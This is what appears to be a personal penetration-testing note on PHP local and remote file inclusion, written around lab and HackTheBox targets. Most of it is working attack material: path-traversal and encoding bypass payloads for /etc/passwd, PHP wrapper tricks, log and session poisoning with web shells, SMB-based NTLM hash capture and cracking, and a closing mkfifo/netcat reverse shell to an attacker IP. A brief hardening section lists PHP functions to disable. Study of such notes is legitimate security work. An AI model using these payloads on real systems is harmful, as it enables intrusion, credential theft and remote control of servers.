LFI and RFI attack range from sensitive information disclosure and Cross-site Scripting to Remote Code Execution
LFI we can  view or access the Local files on the server
in LFI we can access files on system like 
Example - http://example.com/?file=filename.php
or in worst case scenario upload a malicious   code to the server 	http://example.com/?file=../../uploads/evil.php
but even if we can upload we still don't know if it will be uploaded on same server that has the LFI exploit 

# LFI
more examples :
http://example.com/?file=../../../../etc/passwd
scripts can employ search and replace techniques to avoid path traversals. For example:

Code: php
$language = str_replace('../', '', $_GET['language']);
....//....//....//....//....//....//....//....//etc/passwd

In this scenario, input such as ../../../../../etc/passwd will result in the final string to be lang_../../../../../etc/passwd, which is invalid.
../../../../../etc/passwd
Bypass with URL Encoding
On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters ../ can be URL encoded into %2e%2e%2f, which will bypass the filter.

In the last example ....// can be URL encoded into %2e%2e%2e%2e%2f%2f.

The payload %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd 
# wrappers

https://www.php.net/manual/en/wrappers.php.php

php://filter/read=/resource=/etc/passwd 
The following filters will convert the contents of /etc/passwd to base64 and ROT13, respectively.

  Source Code Disclosure via PHP Wrappers
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd

# log poisoning 
default apache log file path
/var/log/apache2/access.log
in old apache servers and nginx servers logs are readable by low priv users such as www 
and the logs contain everything about the request and their User-Agent  we can use the User-Agent string to add our #RCE  
```php

<?php phpinfo(); ?> # Check for php info



<?php system($_GET['cmd']); ?> 

<?php system($_REQUEST["cmd"]); ?>

<?php echo system($_REQUEST["cmd"]); ?>

&cmd=COMMAND

/var/log/apache2/access.log

```
this gets executed by the server and we can run our code 
![[Pasted image 20210930225753.png]]
similar files to do that 
/var/log/nginx/access.log,
/var/log/sshd.log, 
/var/log/mail, 
and /var/log/vsftpd.log.
/proc/self/environ file can be included, which can be poisoned through the User-Agent string.
/var/log/httpd-access.log
# RCE through PHP Session Files
default path /var/lib/php/sessions/sess_SESSION
C:\Windows/Temp
we can try and poison the session file by adding stuff after the ?example=CODE
We can see that the session file contains language preference and the selected page. Let's try poisoning the value of page by sending something through the language parameter. First, request the below URL:

http://134.209.184.216:32415/index.php?language=session_poisoning
This should "poison" the session file and add session_poisoning to it. Let's include the session file once again to look at the contents.

http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

This time the session file contains session_poisoning instead of es.php, which confirms our ability to poison the session file. Next, let's write a PHP web shell to it using the following URL:

http://134.209.184.216:32415/index.php?language=
```
<?php system($_GET['cmd']); ?>
```
We can now include the session file and use the cmd parameter to execute operating system commands.

issue with this that we can only run a command only once 

# Expect Wrapper
The expect wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL will return the output of the id command.

http://blog.inlanefreight.com/index.php?language=expect://id

# base64 wrapper



```
php://filter/convert.base64encode/resource=

```



# Zip Wrapper
The zip wrapper can prove useful in combination with file uploads. If the website allows uploading arbitrary files, an attacker can upload a malicious zip file and include PHP code. 

The files in the zip archive can be referenced using the # symbol, which should be URL-encoded in the request
http://134.209.184.216:30489/index.php?language=zip://malicious.zip%23exec.php&cmd=id
# RFI

 RFI accrues when the allow_url_open setting (enabled by default) and allow_url_include setting have to be turned on
 then we can start a SMB or FTP or HTTP server on our machine and upload a shell code and execute commands by making the server connecting to us and get the shell 
 ![[Pasted image 20211001164936.png]]
 ![[Pasted image 20211001164956.png]]
 When the application is running on Windows, the restrictions applied by allow_url_include can be bypassed by using the SMB protocol.
 ![[Pasted image 20211001165028.png]]
 example :
 =http://OURIP/FILE
 =ftp://
 
 # phpinfo lfi
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
 https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf
 ![[Pasted image 20211101190518.png]]

## Also in windows
If "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks
however php doesn't prevent smb connection so what the attacker can do is host a smb server with [[TCM-Security/AD/Post-Compromise Enum-attacks/Tools]] and because how windows works with smb 
NTLM is a collection of authentication protocols created by Microsoft
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
4. The server retrieves the user password (or equivilent)
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.
so what the attacker can do is host smb server through responder and capture the NTLM hash and crack it 
**Example**
Hackthebox starting point **Responder** machine 

First we host our server with responder
```
sudo responder -I tun0 -dwv 

http://unika.htb/index.php?page=//10.10.16.42/somefile

echo "HASH" > hash

john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![[Pasted image 20221117223325.png]]
then we access our machine with the RFI we found 
![[Pasted image 20221117223409.png]]

 ![[Pasted image 20221117223448.png]]
 and we get the hash next we save the hash to a file 
 and crack it with john
 ![[Pasted image 20221117223509.png]]
 
# defending side 
 -  if the system() function is blocked, a log will be created about the blocked functionality being used when an attacker uses it.
 -  web applications should never display error messages to the website edit the php.ini file and verify: display_errors = Off is set
 -  To block system() in PHP, append the functions you want to block to the "disabled_functions" lines of PHP. A list of functions recommended blocking is: system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source; allow_url_fopen and allow_url_include to Off.
 -  using a docker preventing them from accessing non-web related files.  
 -  if docker isnt an option  adding open_basedir = /var/www in the php.ini file
 -  using WAF Web Application Firewall 

## If you get local file inclusion for log, you can log poison the logs



```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f') ?>